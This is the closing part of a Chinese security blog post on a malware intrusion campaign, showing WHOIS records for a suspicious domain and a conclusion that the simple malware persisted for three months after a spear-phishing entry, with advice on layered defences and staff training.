<pre>Registrant Email: domains@hugedomains.com</pre>

<pre>/* &lt;![CDATA[ */!function(){try{var t=&quot;currentScript&quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&quot;script&quot;),e=t.length;e--;)if(t[e].getAttribute(&quot;cf-hash&quot;))return t[e]}();if(t&amp;&amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&quot;data-cfemail&quot;);if(a){for(e=&quot;&quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&gt; */</pre>

<p>waterglue.org</p>

<pre>Registrant Name:Registration Private</pre>

<pre>Registrant Organization:Domains By Proxy, LLC</pre>

<pre>Registrant Street: DomainsByProxy.com</pre>

<pre>Registrant Street: 14747 N Northsight Blvd Suite 111, PMB 309</pre>

<pre>Registrant City:Scottsdale</pre>

<pre>Registrant State/Province:Arizona</pre>

<pre>Registrant Postal Code:85260</pre>

<pre>Registrant Country:US</pre>

<pre>Registrant Phone:+1.4806242599</pre>

<pre>Registrant Phone Ext:</pre>

<pre>Registrant Fax: +1.4806242598</pre>

<pre>Registrant Fax Ext:</pre>

<pre>Registrant Email:WATERGLUE.ORG@domainsbyproxy.com</pre>

<pre>/* &lt;![CDATA[ */!function(){try{var t=&quot;currentScript&quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&quot;script&quot;),e=t.length;e--;)if(t[e].getAttribute(&quot;cf-hash&quot;))return t[e]}();if(t&amp;&amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&quot;data-cfemail&quot;);if(a){for(e=&quot;&quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&gt; */</pre>

<h3>0x03 结论</h3>

<hr align="center" size="0" width="100%" noshade="noshade">

<p><em><b>恶意软件无需变得高级</b></em></p>

<p>这些恶意软件不高级,同时它们是恶意软件的家族成员,我们在之前看到它们也能绕过安全检测.恶意软件驻存了长达三个月的时间（给予攻击者充分的时间进行操作）.这证明了恶意软件不必高级也能完成任务</p>

<p>使用AV仍是我们最好的防御手段,他们隔离主要的安全事件,因为有太多恶意软件的攻击者用多种不同的技术（没有单一安全解决方案停止这些攻击）.这是我们需要多种安全解决方案的原因,同时，在我们各自的群体中,我们也需要保护人们的安全.</p>

<p><em><b>为何进行鱼叉式钓鱼？</b></em></p>

<p>恶意软件的初始入口是某次鱼叉式钓鱼（针对前面提到的公司）.根据TrendMicro 中的报告,鱼叉式攻击仍然是最常见的APT攻击手段.报告中表明：“APT活动频繁使用鱼叉式钓鱼手段,本质是让高级阶层的目标打开钓鱼电子邮件从而拿下目标.</p>

<p>对于攻击者来说,猜测某组织中的邮箱地址尤其简单,如果目标是高级阶层的官员（由于在线可看到他们的名字）.攻击者可通过在线搜索信息而轻易拿下他们的资料.这使攻击者可根据目标的资料自定义他们的攻击行为</p>

<p>这是一则保护我们组织的消息,我们也必须教育并培训所有在我们组织中的人们（进行安全实战),以免遭受这些类型的社会工程学攻击威胁.</p>

<p><a href="http://drops.wooyun.org/news/6457" target="_blank" rel="external">http://drops.wooyun.org/news/6457</a></p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1115.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1115.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1115.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1115.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/1125.seo/">
        ← Cobaltstrike发送钓鱼邮件
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/1114.seo/">
        Office 365导出所有账户 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archives"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
